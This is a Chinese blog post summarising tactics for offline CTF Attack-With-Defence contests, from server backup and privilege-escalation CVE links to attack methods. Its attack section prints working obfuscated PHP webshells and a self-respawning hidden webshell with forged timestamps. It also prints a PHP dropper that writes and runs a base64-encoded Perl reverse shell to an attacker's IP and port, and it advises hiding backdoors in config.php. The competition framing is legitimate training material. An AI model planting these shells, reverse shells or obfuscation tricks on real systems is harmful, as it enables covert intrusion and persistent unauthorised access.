<!doctype html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>






<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="内网渗透,CTF," />








  <link rel="shortcut icon" type="image/x-icon" href="/images/websiteicon.ico?v=5.1.1" />






<meta name="description" content="简介随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，常见为 AWD:Attack With Defence+公共高地、内网渗透等形式。 由于前段时间准备线下赛时，看了许多大佬们总结的套路，他们各种骚操作让我学到了许多，所以就想把几篇我觉得比较好的总结一下，一来方便自己比赛前回顾一下，二来跟大家分享，希望能对各位CTF朋友们有所帮助。 之后如果学到什么新姿势，我有时间也会updat">
<meta name="keywords" content="内网渗透,CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF线下AWD经验总结">
<meta property="og:url" content="https://edwardchoijc.github.io/CTF线下AWD经验总结.html">
<meta property="og:site_name" content="EDWARD&#39;s Blog">
<meta property="og:description" content="简介随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，常见为 AWD:Attack With Defence+公共高地、内网渗透等形式。 由于前段时间准备线下赛时，看了许多大佬们总结的套路，他们各种骚操作让我学到了许多，所以就想把几篇我觉得比较好的总结一下，一来方便自己比赛前回顾一下，二来跟大家分享，希望能对各位CTF朋友们有所帮助。 之后如果学到什么新姿势，我有时间也会updat">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://owhak23d7.bkt.clouddn.com/18-2-27/38096857.jpg">
<meta property="og:image" content="http://owhak23d7.bkt.clouddn.com/18-2-27/86833740.jpg">
<meta property="og:image" content="http://owhak23d7.bkt.clouddn.com/18-2-27/52742245.jpg">
<meta property="og:image" content="http://owhak23d7.bkt.clouddn.com/18-2-27/54504311.jpg">
<meta property="og:updated_time" content="2018-03-09T06:29:25.396Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF线下AWD经验总结">
<meta name="twitter:description" content="简介随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，常见为 AWD:Attack With Defence+公共高地、内网渗透等形式。 由于前段时间准备线下赛时，看了许多大佬们总结的套路，他们各种骚操作让我学到了许多，所以就想把几篇我觉得比较好的总结一下，一来方便自己比赛前回顾一下，二来跟大家分享，希望能对各位CTF朋友们有所帮助。 之后如果学到什么新姿势，我有时间也会updat">
<meta name="twitter:image" content="http://owhak23d7.bkt.clouddn.com/18-2-27/38096857.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://edwardchoijc.github.io/CTF线下AWD经验总结.html"/>





  <title>CTF线下AWD经验总结 | EDWARD's Blog</title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dcc71352f8b2d3a3db519024d882ec69";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>










  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">EDWARD's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">For  Being  Better.</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-web">
          <a href="/categories/web" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-edge"></i> <br />
            
            WEB
          </a>
        </li>
      
        
        <li class="menu-item menu-item-re">
          <a href="/categories/re" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-gitlab"></i> <br />
            
            RE
          </a>
        </li>
      
        
        <li class="menu-item menu-item-essay">
          <a href="/categories/essay" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-paw"></i> <br />
            
            Essay
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tool">
          <a href="/categories/tool" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-keyboard-o"></i> <br />
            
            Tools & App
          </a>
        </li>
      
        
        <li class="menu-item menu-item-others">
          <a href="/categories/others" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-github-alt"></i> <br />
            
            Others
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-info-circle"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://edwardchoijc.github.io/CTF线下AWD经验总结.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Edward Choi">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="EDWARD's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
            
            
              
                CTF线下AWD经验总结
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-08T09:52:23+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a class="cloud-tie-join-count" href="/CTF线下AWD经验总结.html#comments" itemprop="discussionUrl">
                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv">本文总阅读量
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，常见为 AWD:Attack With Defence+公共高地、内网渗透等形式。</p>
<p>由于前段时间准备线下赛时，看了许多大佬们总结的套路，他们各种骚操作让我学到了许多，所以就想把几篇我觉得比较好的总结一下，一来方便自己比赛前回顾一下，二来跟大家分享，希望能对各位CTF朋友们有所帮助。</p>
<p>之后如果学到什么新姿势，我有时间也会update上来和大家分享:)</p>
<a id="more"></a>
<h4 id="何为AWD"><a href="#何为AWD" class="headerlink" title="何为AWD"></a>何为AWD</h4><p>比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
<ul>
<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）</li>
<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
<li>flag在主办方的设定下每隔一定时间刷新一轮</li>
<li>各队一般都有自己的初始分数</li>
<li>flag一旦被其他队伍拿走，该队扣除一定积分</li>
<li>扣除的积分由获取flag的队伍均分</li>
<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分</li>
<li>一般每个队伍会给一个低权限用户，非root权限</li>
</ul>
<blockquote>
<p>具体规则以具体比赛规则为准，但一般大同小异</p>
</blockquote>
<h4 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h4><p>网络拓扑如下图所示（示例）：</p>
<p><img src="http://owhak23d7.bkt.clouddn.com/18-2-27/38096857.jpg" alt=""></p>
<p>首先先理清好网络拓扑关系，节点与各链路之间的关联，方便下一步和队友配合，要不然不知道对手在哪就GG。</p>
<h4 id="比赛分工"><a href="#比赛分工" class="headerlink" title="比赛分工"></a>比赛分工</h4><p>线下赛一般3人左右，2人攻击，1人防御，因为发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。</p>
<p>一般来说，比赛中每个队伍需要维护多个靶机，web、二进制等，也可以每人负责一台，各自负责攻击和防御。</p>
<h2 id="套路小结"><a href="#套路小结" class="headerlink" title="套路小结"></a>套路小结</h2><p>常规的CTF线下攻防思路：</p>
<p><img src="http://owhak23d7.bkt.clouddn.com/18-2-27/86833740.jpg" alt=""></p>
<h4 id="服务器登录"><a href="#服务器登录" class="headerlink" title="服务器登录"></a>服务器登录</h4><p>一般比赛都通过ssh连接服务器，拿到网络拓扑图后，和队友进行分工，一个人检查有没有弱口令（弱口令的问题几乎是必考），有的话对密码进行修改（越复杂越好，当然前提是自己也方便）。web后台也很有可能存在弱口令，一般都是<code>admin/admin</code> ，<code>admin/123456</code>，<code>test/test</code>等等，同样需要立即修改，并将情况反馈给队友，凭着你的手速修改其他队伍的后台口令，为本队所用，甚至有些严重的可以利用后台getshell。</p>
<p>与此同时，还需要（一定要！必须要！）有人在比赛开始后第一时间备份服务器中web目录下的文件（<code>/var/www/html</code>）。这是自我审计的基础，也是防止服务器在比赛中出现异常的情况下可以立即恢复到初始状态的先决条件。有的比赛可以提供3次左右的恢复初始设置的机会（但一般会伴随着扣分为代价），有的比赛不提供，所以备份十分重要。</p>
<blockquote>
<p>可以用scp命令，也可用一些图形化的工具：Winscp，MobaXterm等，操作起来比较方便。</p>
</blockquote>
<p>接着就是上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p>
<blockquote>
<p><a href="http://exploit.linuxnote.org/" target="_blank" rel="noopener">Linux_Local_Root_Exploits</a>  ：这网站收集了许多linux本地提权的poc。</p>
<p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux-kernel-exploits(github)</a>  ：一个挺全的提权exp项目，收集了04年至今的exp，并按年份和CVE归类</p>
</blockquote>
<p>下面分享几个最近两年并且影响范围比较大的：</p>
<ul>
<li><p><a href="https://github.com/torvalds/linux/commit/5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4" target="_blank" rel="noopener">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 )</a> ：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限</p>
</li>
<li><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64))</a> ：低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限</p>
</li>
<li><p><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a" target="_blank" rel="noopener">CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8)</a> ：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限</p>
<blockquote>
<p>POC：<a href="https://www.seebug.org/vuldb/ssvid-92567" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92567</a></p>
</blockquote>
</li>
<li><p><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367" target="_blank" rel="noopener">CVE-2017-1000367(sudo本地提权漏洞 )</a> ：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p>
</li>
<li><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">CVE-2016-1247(Nginx权限提升漏洞)</a> ：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。</p>
<blockquote>
<p>POC：<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p>
</blockquote>
</li>
</ul>
<p>我收集了一些提权的脚本工具集，可作参考：<a href="https://github.com/edwardchoijc/ctf-toolkit/Linux/getROOT" target="_blank" rel="noopener">https://github.com/edwardchoijc/ctf-toolkit/Linux/getROOT</a></p>
<h4 id="How-to-Attack"><a href="#How-to-Attack" class="headerlink" title="How to Attack"></a>How to Attack</h4><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><p>如果是在同个C段，或者B段，均可以使用扫描器进行扫描得出。还要记得扫端口，这很重要，当然这个端口扫描是建立在没有自己靶机权限的情况下。用nmap也行，自己写的脚本或者网上找的也行。</p>
<h5 id="找预留后门"><a href="#找预留后门" class="headerlink" title="找预留后门"></a>找预留后门</h5><p>有的比赛环境，为了照顾比较菜的选手，预留了一句话后门，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分。</p>
<p>将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留）</p>
<p>发现后门后，第一时间删除，同时利用这个漏洞发起第一波攻击，如果利用菜刀连，显然不够优雅，还没连完，人家估计都删的差不多了，因此这个漏洞虽然是送分，但拼的是手速，因此得提前准备好脚本</p>
<h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>代码审计是攻防一体的工作，当发现漏洞时，修补的同时跟进攻的队友商讨如何利用</p>
<p><img src="http://owhak23d7.bkt.clouddn.com/18-2-27/52742245.jpg" alt=""></p>
<h5 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h5><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。</p>
<p>比较好的一句话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=chr(96^5);</span><br><span class="line">$b=chr(57^79);</span><br><span class="line">$c=chr(15^110);</span><br><span class="line">$d=chr(58^86);</span><br><span class="line">$e=&apos;($_REQUEST[C])&apos;;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>配置为<code>?b=))99(rhC(tseuqeR+lave</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sF=&quot;PCT4BA6ODSE_&quot;;</span><br><span class="line">$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);</span><br><span class="line">$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>配置为<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code> ，连接密码为<code>0</code>（数字）</p>
<h5 id="单个文件批量上传"><a href="#单个文件批量上传" class="headerlink" title="单个文件批量上传"></a>单个文件批量上传</h5><p>当我们通过某个漏洞批量上传了很多的webshell后，可能想要批量传个后门以备后用。这时我们可以通过用脚本批量上传来提高效率：<a href="https://github.com/edwardchoijc/ctf-toolkit/tree/master/batch_upload_file" target="_blank" rel="noopener">batch_upload_file</a></p>
<h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p>上面说到利用预留后门可以维持权限，主要有两种，一种是“不死马”，另一种是反弹shell</p>
<ul>
<li><p>“不死马”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    $file = &apos;.demo.php&apos;;</span><br><span class="line">    $shell = &quot;&lt;?php $_hR=chr(99).chr(104).chr(114);$_cC=$_hR(101).$_hR(118).$_hR(97).$_hR(108).$_hR(40).$_hR(36).$_hR(95).$_hR(80).$_hR(79).$_hR(83).$_hR(84).$_hR(91).$_hR(49).$_hR(93).$_hR(41).$_hR(59);$_fF=$_hR(99).$_hR(114).$_hR(101).$_hR(97).$_hR(116).$_hR(101).$_hR(95).$_hR(102).$_hR(117).$_hR(110).$_hR(99).$_hR(116).$_hR(105).$_hR(111).$_hR(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;&quot;;</span><br><span class="line">    //$_hR=&apos;chr&apos;</span><br><span class="line">    //$_cC=&apos;eval($_POST[1]);&apos;</span><br><span class="line">    //$_fF=&apos;create_function&apos;</span><br><span class="line">    while(true)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(&apos;chmod 777 .demo.php&apos;);</span><br><span class="line">        touch(&quot;.demo.php&quot;, mktime(11,11,11,11,11,2018));</span><br><span class="line">        usleep(50);</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用预留后门，上传上面的“不死马”并访问，就会一直生成<code>.demo.php</code>的一句话木马，木马内容可以自行修改，只要别被其他队伍看懂就行。</p>
<blockquote>
<p>文件名前加一个点，能更好地隐藏文件</p>
</blockquote>
<p>想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">while (1) &#123;</span><br><span class="line">	$pid=1234;</span><br><span class="line">	@unlink(&apos;.demo.php&apos;);</span><br><span class="line">	exec(&apos;kill -9 $pid&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>先查看进程，查看对应的pid，再执行即可。</p>
</li>
<li><p>md5马+header</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &apos;hello&apos;;</span><br><span class="line">if(md5($_POST[&apos;pass&apos;])==&apos;d8d1a1efe0134e2530f503028a825253&apos;)</span><br><span class="line">	if (@$_SERVER[&apos;HTTP_USER_AGENT&apos;] == &apos;flag&apos;)&#123;</span><br><span class="line">	$test= &apos;flag&apos;;</span><br><span class="line">    header(&quot;flag:$test&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>放进<code>config.php</code>效果最好，因为一般很少人去看这个。</p>
</li>
</ul>
<ul>
<li><p>反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function which($pr)&#123; </span><br><span class="line">        $path = execute(&quot;which $pr&quot;); </span><br><span class="line">        return ($path ? $path : $pr); </span><br><span class="line">    &#125;</span><br><span class="line">    function execute($cfe)&#123; </span><br><span class="line">        $res = &apos;&apos;; </span><br><span class="line">        if ($cfe)&#123; </span><br><span class="line">            if(function_exists(&apos;exec&apos;))&#123; </span><br><span class="line">                @exec($cfe,$res); </span><br><span class="line">                $res = join(&quot;\n&quot;,$res); </span><br><span class="line">            &#125;</span><br><span class="line">            elseif(function_exists(&apos;shell_exec&apos;))&#123; </span><br><span class="line">                $res = @shell_exec($cfe); </span><br><span class="line">            &#125;</span><br><span class="line">            elseif(function_exists(&apos;system&apos;))&#123;</span><br><span class="line">                @ob_start();</span><br><span class="line">                @system($cfe);</span><br><span class="line">                $res = @ob_get_contents();</span><br><span class="line">                @ob_end_clean();</span><br><span class="line">            &#125;</span><br><span class="line">            elseif(function_exists(&apos;passthru&apos;))&#123; </span><br><span class="line">            @ob_start(); </span><br><span class="line">            @passthru($cfe); </span><br><span class="line">            $res = @ob_get_contents(); </span><br><span class="line">            @ob_end_clean(); </span><br><span class="line">            &#125;</span><br><span class="line">            elseif(@is_resource($f = @popen($cfe,&quot;r&quot;)))&#123; </span><br><span class="line">                $res = &apos;&apos;;</span><br><span class="line">                while(!@feof($f))&#123;</span><br><span class="line">                    $res .= @fread($f,1024);</span><br><span class="line">                &#125;</span><br><span class="line">                @pclose($f);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $res; </span><br><span class="line">    &#125; </span><br><span class="line">    function cf($fname,$text)&#123;</span><br><span class="line">        if($fp=@fopen($fname,&apos;w&apos;)) &#123;</span><br><span class="line">            @fputs($fp,@base64_decode($text));</span><br><span class="line">            @fclose($fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $yourip = &quot;127.0.0.1&quot;;</span><br><span class="line">    $yourport = &apos;9999&apos;;</span><br><span class="line">    $usedb = array(&apos;perl&apos;=&gt;&apos;perl&apos;,&apos;c&apos;=&gt;&apos;c&apos;);</span><br><span class="line">  $back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;</span><br><span class="line">    /*</span><br><span class="line">    base64加密内容如下：</span><br><span class="line">    #!/usr/bin/perl</span><br><span class="line">    use Socket;</span><br><span class="line">    $cmd= &quot;lynx&quot;;</span><br><span class="line">    $system= &apos;echo &quot;`uname -a`&quot;;echo &quot;`id`&quot;;/bin/sh&apos;;</span><br><span class="line">    $0=$cmd;</span><br><span class="line">    $target=$ARGV[0];</span><br><span class="line">    $port=$ARGV[1];</span><br><span class="line">    $iaddr=inet_aton($target) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">    $paddr=sockaddr_in($port, $iaddr) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">    $proto=getprotobyname(&apos;tcp&apos;);</span><br><span class="line">    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">    connect(SOCKET, $paddr) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">    open(STDIN, &quot;&gt;&amp;SOCKET&quot;);</span><br><span class="line">    open(STDOUT, &quot;&gt;&amp;SOCKET&quot;);</span><br><span class="line">    open(STDERR, &quot;&gt;&amp;SOCKET&quot;);</span><br><span class="line">    system($system);</span><br><span class="line">    close(STDIN);</span><br><span class="line">    close(STDOUT);</span><br><span class="line">    close(STDERR);</span><br><span class="line">     */</span><br><span class="line">    cf(&apos;/tmp/.bc&apos;,$back_connect);</span><br><span class="line">    $res = execute(which(&apos;perl&apos;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，之后就可以一直得分了</p>
<p><img src="http://owhak23d7.bkt.clouddn.com/18-2-27/54504311.jpg" alt=""></p>
</li>
</ul>
